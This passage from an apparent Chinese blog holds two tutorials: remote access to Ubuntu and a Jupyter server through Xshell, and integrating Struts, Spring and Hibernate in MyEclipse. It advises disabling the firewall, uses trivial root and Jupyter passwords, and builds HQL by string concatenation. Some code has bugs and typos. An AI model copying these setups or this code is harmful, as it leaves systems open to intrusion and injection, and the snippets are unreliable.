鼠标指针定位到最后常用的就是以上一些了，其他的操作有需要的话在来看看。 注意：以上内容都是在服务端计算机中进行配置 好了，好了，好了。至此，我们已经完成了环境的搭建，接下来我们将介绍如何使用Xshell远程连接Ubuntu操作，拿好你的小板凳快快做好。 二、Xshell远程连接Ubuntu注意：以下内容都是在客户端计算机中进行配置 安装好Anaconda之后，我们需要通过Xshell使用Xshell来远程连接我们的Ubuntu系统，此时我们的目标需要转移至客户端了。首先在以上软件下载中根据链接下载Xshell，之后Windows傻瓜式安装好Xshell（顺便把Xftp安装下，与Xshell配套使用的，虽然在本文中使用不到）。之后的操作会有几个坑，但是不必担心，博主会带你一个一个的填掉 o(*≧▽≦)ツ┏━┓。 坑一：连接失败我们双击打开Xshell，并点击文件并新建，然后根据如下图进行操作： 补充，上方中的主机属性是填Ubuntu的ip地址，该地址可在Ubuntu的终端执行ifconfig（windows是ipconfig）命令得到。 以上信息填写完之后在出现的界面输入自己Ubuntu下的用户登录密码即可。执行之后你花发现连接失败，此时需要检查一下Ubuntu是否与客户端处于同一网段下，可以将Ubuntu设置成桥接模式（右键Ubuntu虚拟机然后进行设置），之后再次检查一下客户端（Windows10）是否能够ping通服务端（Ubuntu），在客户端的cmd中执行如下：1ping XXX.XXX.XXX.XXX # XXX.XXX.XXX.XXX为服务端的ip 在以上操作之后，一般就能ping通了，如果失败了则在Ubuntu终端下执行sudo wfw disable命令关闭防火墙。 坑二：连接失败 (ノへ￣、) 在如上操作之后，我们再次尝试重新连接。我们可以发现依然连接失败，显示拒绝连接之类的信息。这是因为Xshell是通过ssh协议来连接Ubuntu的，但是Ubuntu默认是没有开启ssh服务的，所以我们需要在其终端执行如下命令来开启ssh服务：1sudo service ssh restart 之后我们再次尝试连接。 坑三：连接失败 (ノへ￣、) (ノへ￣、) 一般来讲，这个时候依然是连接失败，此时我们需要安装在Ubuntu下安装ssh服务，执行以下命令进行安装：1sudo apt-get install openssh-server 待其安装好后，我们再再再次连接Ubunut。 OK，以上坑踩过之后也该连接成功了吧。的确此时你将成功连接到Ubuntu了，之后Xshell将打开一个终端，这个终端就是Ubuntu下的终端了，也就是说我们可以使用该终端控制Ubuntu了，并对其进行Shell操作。ヽ(✿ﾟ▽ﾟ)ノ 三、Jupyter notebook服务器的配置及远程访问由于我们在之前已经安装过了Anaconda，所以此时的Ubuntu就已经集成了ipython as well as （秀一下英语，虽然很烂）jupyter-notebook，对此，将通过Xshell远程连接Ubuntu来搭建Jupyter notebook的服务器，并对其进行远程访问。 在终端中启动ipython或者python，然后执行以下命令12from IPython.lib import passwdpasswd() 上述命令执行之后将会在终端显示设置密码，比如在这我们将密码设置成：123，之后enter并确认即可。 注意：这里的密码是暗文的形式，输入之后不会显示的，还有此时你输入的密码需要记住，因为我们待会远程访问jupyter notebook服务器的时候需要用到该密码进行登录 密码输入之后，我们将会看到有一个较长字符串，该字符串是上述密码的加密形式，我们需要将其复制下来，在之后的ipython_notebook_config.py文件的设置中需要使用，操作结果如下图所示： 随后为了方便上述加密密码字符串的记录，我们在此开启另一个终端（这也是Xshell的方便所在），然后使用如下命令创建一个服务器名，比如，在此我们将该名字设置为：XXX1ipython profile create txj 在上述服务器名创建完成之后，将在终端输出两个py文件（ipython_config.py、ipython_kernel_config.py）路径，之后使用如下cd命令我们进入到.ipython路径1cd .ipython/ 操作图示如下： 进入.ipython目录之后使用ls命令将会列出上述创建的两个py文件所在，但是我们需要再额外创建一个py配置文件并对其进行设置，在这里我们使用vim来进行操作，关于vim的使用，上述的Anaconda环境配置过程中已经介绍了，遗忘的朋友可以返回看一看再熟悉一下。熟悉之后我们完成如下步骤：12cd .ipython/profile_txj # 终端进入.ipython路径vim ipython_notebook_config.py # 使用vim进行创建ipython_notebook_config.py并对其进行编辑 进入到vim环境之后我们在ipython_nnotebook_config.py文件中编辑如下内容：1234567c = get_config()c.IPKernelApp.pyalb = \"inline\"c.NotebookApp.ip = \"*\"c.NotebookApp.open_browser = Falsec.NotebookApp.allow_root = Truec.NotebookApp.password = u\"加密后的密码\" # 这里我们需要使用上述加密后的密码，在另一个终端可见c.NotebookApp.port = 8888 # 在这里，我们需要设置一个jupyter-notebook的端口，尽量设置的少见点，以免造成端口冲突 编辑好后，wq命令保存并退出。 在上述一切操作完成之后，我们现在来开启该服务器，新建一个终端并执行如下命令12jupyter notebook --config=你的ipython_notebook_config.py文件路径 # 例如/home/lxj/.ipython/profile_XXX/ipython_notebook_config.py 在上述命令执行之后，如果出现如下图片所示内容，则说明我们的服务端已经正常启动 在服务端启动完成之后，我们在客户端打开浏览器，访问XXX.XXX.XXX.XXX:8888（ubuntu的ip加开放的端口）试试，看看能否正常请求。如果随后出现一个如上所示的Jupyter notebook的登录页面，那么恭喜你，至此Jupyter notebook服务器配置完成，并能够远程访问了。在表单中输入你所设置的密码（上面第一步设置的密码，123）即可开始你的深度学习之旅了。 以上就是Jupyter notebook服务器的配置及远程访问的内容了，但是能否正常使用requests、numpy、pandas、matplotlib、Tensorflow呢，我们下面将通过几个简单的例子来对其进行测试。 四、远程环境的测试通过上述的操作，我们已经完成了远程操作。但是保险起见，我们对其进行验证，看看anaconda下的第三方包能否正常使用。为此，我们通过以下几个案例来进行验证： 百度及其子链接的简单爬虫（requests， BeautifulSoup） 数据可视化操作（pandas，numpy，matplotlib，skimage） 机器学习之鸢尾花的分类预测（sklearn， numpy） 4.1 简单爬虫123456789101112import requestsfrom bs4 import BeautifulSoupdef get_page(url, headers): return requests.get(url).textif __name__ == \"__main__\": baidu_url = \"https://www.baidu.com\" baidu_soup = BeautifulSoup(get_page(baidu_url), \"lxml\") son_links = [biaoqian_a.attrs[\"href\"] for biaoqian_a in baidu_soup.find_all(\"a\")] for index, son_link in enumerate(son_links): print(\"正在请求第&#123;&#125;个页面\".format(str(index))) print(get_page(son_link)) 4.2 数据可视化123456789101112% matplot inlineimport numpy as npimport pandas as pdfrom amtplotlib import pyplot as pltimport skimagex = np.random.uniform(1, 100, 100)y = np.random.uniform(1, 100, 100)plt.plot(x, y)plt.show()XXXXXXXX 4.3 支持向量机下的鸢尾花的识别1XXXX 总结通过上述的演示，已经完成了windows10下使用xshell远程连接linux系统以及远程访问jupyter-notebook服务，并通过几个小例子来对其进行验证说明可以正常使用linux下的anaconda。虽然msi computer不支持在本机安装linux系统，但是我们依然可以在另一台computer中安装并远程进行访问，而且其中的优势也是显而易见的： 并不像以前那样虚拟机和物理机都在同一台computer中运行，而是将其中一台computer作为linux服务器，然后使用xshell对其进行远程操作，在一定程度上减小其压力。 方便了各个进程之间的管理且易于操作 。。。。。。 2018-09-23,By Zero","path":"2018/09/23/Xshell远程连接linux并远程访问ipython服务/"},{"title":"基于MyEclipse的SSH框架整合","text":"以下内容为博主学习Struts+Spring+Hibernate框架时所写笔记，有点凌乱，还未整理。 1. 将Spring与Hibernate进行整合1.1 为项目添加Spring的开发支持 在实际开发的过程中一定要先啊添加Spring而不是Hibernate，否则会出现难以捉摸的bug。 1.1.1 创建一个新的web项目SSHDemo1.1.2 添加Spring configure facets install spring facet next勾上Spring Persistence，在这里面有个orm开发包，含有Hibernate整合、IBatis整合、JDO等整合。 1.2 添加Hibernate configure facets install Hibernate, 暂时选择Hibernate4.1 facet，如果Hibernate交给了Spring管理，那么Hibernate不再需要HibernateSessionFactory工具类的生成，随后SessionFactory交给了Spring负责管理，但是需要生成hibernate.cfg.xml文件，这个文件不再进行数据库，只进行相关的 将Create SessionFactory class去掉，√上Create hibernate.cfg.xml file-&gt; next 打开mysql：windows -&gt; perspective -&gt; open perspective -&gt; other -&gt; database explore -&gt; 之后就可以右键添加自己的数据库了 在上一步完成之后就可以在配置DB Driver的时候选择mysql了 -&gt; next -&gt; finish 1.3 将Spring和Hibernate进行整合1.3.1 修改hibernate.cfg.xml文件1234567891011121314&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;!DOCTYPE hibernate-configuration PUBLIC \"-//Hibernate/Hibernate Configuration DTD 3.0//EN\" \"http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\"&gt;&lt;!-- Generated by MyEclipse Hibernate Tools. --&gt;&lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;property name=\"dialect\"&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt; &lt;property name=\"show_sql\"&gt;true&lt;/property&gt; &lt;property name=\"format_sql\"&gt;true&lt;/property&gt; &lt;/session-factory&gt;&lt;/hibernate-configuration&gt; 1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息123456789db.driver=com.mysql.cj.jdbc.Driverdb.url=jdbc:mysql://localhost:3306/test?useSSL=true&amp;serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8db.user=rootdb.password=123pool.max=1pool.min=1pool.init=10pool.idle=20 1.3.3 配置applicationContext.xml文件要想将Spring和Hibernate进行整合，那么就需要配置applicationContext.xml文件，以下是常用的配置步骤，每个步骤分别对应后面的代码。 在namespace中勾上context，用于添加Annotation支持 添加支持Annotation 通过classpath加载databasse.properties文件 配置数据库连接池 配置Hibernate的相关环境，SessionFactory可以打开Session 事务配置的声明 定义事务的切入点 添加支持Annotation 123&lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; 通过classpath加载databasse.properties文件 12&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; 配置数据库连接池 1234567891011&lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; 配置Hibernate的相关环境，SessionFactory可以打开Session 123456789&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; 事务的配置声明 123456789101112131415161718&lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; 定义事务的切入点 12345&lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt; _以上就是本次项目中applicationContext.xml文件的相关配置，完整的applicationContext.xml文件的代码如下：_ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\"&gt; &lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; &lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; &lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; &lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; &lt;!-- 配置事务处理，所有的事务都采用AOP的方式，本处只声明SessionFactory要进行事务处控制--&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.orm.hibernate4.HibernateTransactionManager\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\" /&gt; &lt;/bean&gt; &lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt;&lt;/beans&gt; 2. 编写src代码用于本次测试2.1 生成News.java的POJO类我们利用Annotation的注解方式完成： windows -&gt; perspetive -&gt; open perspective -&gt; database explore -&gt; 右键mysql -&gt; 连接 找到要处理的表 -&gt; 右键Hibernate reverse -&gt; src为项目的src路径，java package一般为com.tianxingjian.pojo -&gt; √create pojo -&gt; 点击add Hibernate mapping annotations to pojo -&gt; next -&gt; id generator -&gt; native -&gt; next -&gt; 点击表然后native -&gt; finish，生成pojo的时候最好把create abstract class取消掉，生成之后为了便于之后的JUnit测试加上toString方法，完整的News.java代码如下：上述操作完成之后pojo类的映射操作将自动保存在hibernate.cfg.xml文件中，代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889package com.tianxingjian.pojo;import java.util.Date;import javax.persistence.Column;import javax.persistence.Entity;import javax.persistence.GeneratedValue;import javax.persistence.Id;import javax.persistence.Table;import javax.persistence.Temporal;import javax.persistence.TemporalType;/** * News entity. @author MyEclipse Persistence Tools */@Entity@Table(name = \"news\", catalog = \"news_db\")public class News implements java.io.Serializable &#123; // Fields private Integer nid; private String title; private Date date; private String content; // Constructors /** default constructor */ public News() &#123; &#125; /** full constructor */ public News(String title, Date date, String content) &#123; this.title = title; this.date = date; this.content = content; &#125; // Property accessors @Id @GeneratedValue @Column(name = \"nid\", unique = true, nullable = false) public Integer getNid() &#123; return this.nid; &#125; public void setNid(Integer nid) &#123; this.nid = nid; &#125; @Column(name = \"title\", length = 100) public String getTitle() &#123; return this.title; &#125; public void setTitle(String title) &#123; this.title = title; &#125; @Temporal(TemporalType.DATE) @Column(name = \"date\", length = 10) public Date getDate() &#123; return this.date; &#125; public void setDate(Date date) &#123; this.date = date; &#125; @Column(name = \"content\", length = 100) public String getContent() &#123; return this.content; &#125; public void setContent(String content) &#123; this.content = content; &#125; @Override public String toString() &#123; return \"News [nid=\" + nid + \", title=\" + title + \", date=\" + date + \", content=\" + content + \"]\\n\"; &#125;&#125; 1&lt;mapping class=\"com.tianxingjian.pojo.News\" /&gt; 2.2 定义INewsDAO.java接口123456789101112131415package com.tianxingjian.dao;import java.util.List;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsDAO &#123; public boolean doCreate(News vo) throws Exception; public boolean doUpdate(News vo) throws Exception; public News getElementById(Integer id) throws Exception; public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; findAll() throws Exception; public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception; public Integer getAllCount(String column, String keyWord) throws Exception;&#125; 2.2 实现NewsDAOImpl.java类12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879package com.tianxingjian.dao.impl;import java.util.Iterator;import java.util.List;import java.util.Set;import javax.annotation.Resource;import org.hibernate.Criteria;import org.hibernate.Query;import org.hibernate.SessionFactory;import org.springframework.stereotype.Component;import com.tianxingjian.dao.INewsDAO;import com.tianxingjian.pojo.News;@Componentpublic class NewsDAOImpl implements INewsDAO &#123; @Resource private SessionFactory sessionFactory; @Override public boolean doCreate(News vo) throws Exception &#123; return sessionFactory.getCurrentSession().save(vo) != null; &#125; @Override public boolean doUpdate(News vo) throws Exception &#123; String hql = \"update News set title=?, date=?, content=? where nid=?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, vo.getTitle()); query.setParameter(1, vo.getDate()); query.setParameter(2, vo.getContent()); query.setParameter(3, vo.getNid()); return query.executeUpdate() &gt; 0; &#125; @Override public News getElementById(Integer id) throws Exception &#123; return (News) this.sessionFactory.getCurrentSession().get(News.class, id); &#125; @Override public boolean doRemoveBatch(Set&lt;Integer&gt; ids) throws Exception &#123; StringBuffer buffer = new StringBuffer(); buffer.append(\"delete from News where nid in (\"); Iterator&lt;Integer&gt; iterator = ids.iterator(); while (iterator.hasNext()) &#123; buffer.append(iterator.next()).append(\",\"); &#125; buffer.delete(buffer.length()-1, buffer.length()).append(\")\"); Query query = this.sessionFactory.getCurrentSession().createQuery(buffer.toString()); return query.executeUpdate() &gt; 0; &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAll() throws Exception &#123; Criteria criteria = this.sessionFactory.getCurrentSession().createCriteria(News.class); return criteria.list(); &#125; @SuppressWarnings(\"unchecked\") @Override public List&lt;News&gt; findAllSplit(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception &#123; String hql = \"from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + keyWord + \"%\"); query.setFirstResult((currentPage-1)*lineSize); query.setMaxResults(lineSize); return query.list(); &#125; @Override public Integer getAllCount(String column, String keyWord) throws Exception &#123; String hql = \"select count(*) from News as n where n.\" + column + \" like ?\"; Query query = this.sessionFactory.getCurrentSession().createQuery(hql); query.setParameter(0, \"%\" + column + \"%\"); Long count = (Long) query.uniqueResult(); return count.intValue(); &#125;&#125; 2.3 定义业务层INewsService.java接口12345678910111213141516package com.tianxingjian.service;import java.util.List;import java.util.Map;import java.util.Set;import com.tianxingjian.pojo.News;public interface INewsService &#123; public boolean insert(News vo) throws Exception; public boolean update(News vo) throws Exception; public News get(Integer id) throws Exception; public boolean delete(Set&lt;Integer&gt; ids) throws Exception; public List&lt;News&gt; list() throws Exception; public Map&lt;String, Object&gt; list(String column, String keyWord, Integer currentPage, Integer lineSize) throws Exception;&#125; 2.4 编写测试程序，用JUnit 点击IServiceImpl 点击MyEclipse右上角的New图标 查询Junit Test Case 将package改为com.tianxingjian.test -&gt; next 全选 -&gt; finish 使用JUnit进行单个方法的测试： 选中需要测试的类 把类进行展开 把C进行展开 就可以看到测试类中所有的方法 点击所需要运行的测试方法然后右键junit运行就行了 _注意: 在写hql语句的时候表名应该大写表示对象而不是小写，如下所示_ 12String hql = \"update News set title=?,date=?,content=? where nid=?\"; // 正确String hql = \"update news set title=?,date=?,content=? where nid=?\"; // 错误 完整JUnit测试代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798package com.tianxingjian.test;import static org.junit.Assert.*;import java.util.Date;import java.util.HashSet;import java.util.Set;import org.junit.Test;import org.springframework.context.ApplicationContext;import org.springframework.context.support.ClassPathXmlApplicationContext;import org.springframework.stereotype.Service;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;import junit.framework.TestCase;public class INewsServiceTest &#123; public static ApplicationContext ctx; static &#123; ctx = new ClassPathXmlApplicationContext(\"applicationContext.xml\"); &#125; @Test public void testInsert() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setTitle(\"SSH整合了-\" + System.currentTimeMillis()); vo.setDate(new Date()); vo.setContent(\"SSH内容很丰富！\"); try &#123; TestCase.assertEquals(service.insert(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testUpdate() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); News vo = new News(); vo.setNid(5); vo.setTitle(\"准备开始学习了！\"); vo.setDate(new Date()); vo.setContent(\"你高兴么！\"); try &#123; TestCase.assertEquals(service.update(vo), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testGet() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.get(1)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125; @Test public void testDelete() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); set.add(5); set.add(4); try &#123; TestCase.assertEquals(service.delete(set), true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testList() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; @Test public void testListStringStringIntegerInteger() &#123; INewsService service = ctx.getBean(\"newsServiceImpl\", INewsService.class); try &#123; System.out.println(service.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; // TODO Auto-generated catch block e.printStackTrace(); &#125; &#125;&#125; 3.将Spring和Struts2.x进行整合3.1 添加Struts2.x的支持 install Struts2.x facet -&gt; next -&gt; next -&gt; √ Spring Plugin -&gt; finish 3.2 为Spring添加监听器，即可在web中使用 监听器名称：org.springframework.web.context.ContextLoderListen 3.2.1 在web.xml文件中添加监听器（MyEclipse会自动添加）123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt; &lt;/listener&gt; 3.2.2 在web.xml文件中将applicationContext.xml里的配置设置到Web环境之中,将路径的信息设置为applicationContext.xml属性范围（MyEclipse会自动进行配置）1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;classpath:applicationContext.xml&lt;/param-value&gt; &lt;/context-param&gt; 3.3 进行Struts的相关配置3.3.1 建立struts.properties文件，这个文件是用于设置对象工厂123struts.i18n.encoding=UTF-8struts.custom.i118n.resource=Messages,Pagesstruts.objectFactory=spring 3.1.2 修改struts.xml文件本次只是将SSH进行整合，所以只是简单的配置了name、namespace和extends，在实际开发中，需要在package里进行相关跳转路径的配置 123&lt;package name=\"root\" namespace=\"/\" extends=\"struts-default\"&gt; &lt;/package&gt; 3.1.3 编写NewsAction.java程序，用于进行相关的业务操作NewsAction.java的完整代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687package com.tianxingjian.action;import java.util.HashSet;import java.util.Set;import javax.annotation.Resource;import org.apache.struts2.ServletActionContext;import org.apache.struts2.convention.annotation.Action;import org.apache.struts2.convention.annotation.Namespace;import org.apache.struts2.convention.annotation.ParentPackage;import org.springframework.stereotype.Repository;import com.opensymphony.xwork2.ActionSupport;import com.tianxingjian.pojo.News;import com.tianxingjian.service.INewsService;@Repository@ParentPackage(\"root\")@Namespace(\"/pages/news\")@Action(value=\"NewsAction\")@SuppressWarnings(\"serial\")public class NewsAction extends ActionSupport&#123; @Resource private INewsService newsService; private News news = new News(); public News getNews() &#123; return news; &#125; public void insert() &#123; System.out.println(\"【新闻数据增加】数据\" + this.news); try &#123; System.out.println(\"【新闻数据增加】业务调用结果\" + this.newsService.insert(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void update() &#123; System.out.println(\"【新闻数据修改】数据\" + this.news); try &#123; System.out.println(\"【新闻数据修改】业务调用结果\" + this.newsService.update(this.news)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void delete() &#123; String ids = ServletActionContext.getRequest().getParameter(\"ids\"); System.out.println(\"【新闻数据删除】数据\" + ids); try &#123; Set&lt;Integer&gt; set = new HashSet&lt;Integer&gt;(); String result [] = ids.split(\"_\"); for (int x=0; x&lt;result.length; x++) &#123; set.add(Integer.parseInt(result[x])); &#125; System.out.println(\"【新闻数据删除】业务调用结果\" + this.newsService.delete(set)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void get() &#123; System.out.println(\"【新闻数据取得】数据\" + this.news); try &#123; System.out.println(\"【新闻数据取得】业务调用结果：\" + this.newsService.get(this.news.getNid())); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void list() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public void listSplit() &#123; System.out.println(\"【新闻数据查询】数据\" + this.news); try &#123; System.out.println(\"【新闻数据查询】业务调用结果：\" + this.newsService.list(\"title\", \"\", 1, 3)); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 3.1.4 启动Tomcat并进行测试（测试时在地址上进行传参） 启动Tomcat 访问地址： 添加地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!insert.action?news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 更新地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!update.action?news.nid=5&amp;news.title=&quot;今天好心情！&quot;&amp;news.content=&quot;是的呢！今天好心情啊！！！“ 删除地址：http://localhost:8080/SSHDemo/pages/news/NewsAction!delete.action?ids=&quot;6_7“ 查询全部：http://localhost:8080/SSHDemo/pages/news/NewsAction!list.action 分页查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!listSplit.action 根据id查询：http://localhost:8080/SSHDemo/pages/news/NewsAction!get.action?news.nid=6 _在运行的时候有可能会出现以下几个错误：_ java.lang.NoSuchMethodError:antlr.collections.AST.getLine()_**解决方案：这个错误的产生原因是Hibernate和Struts中都存在antrl的文件，只需要将低版本的jar文件进行移除就可以了。操作：window -&gt; preference -&gt; lib -&gt; struts2.1 -&gt; core -&gt; 取消antrl的jar文件 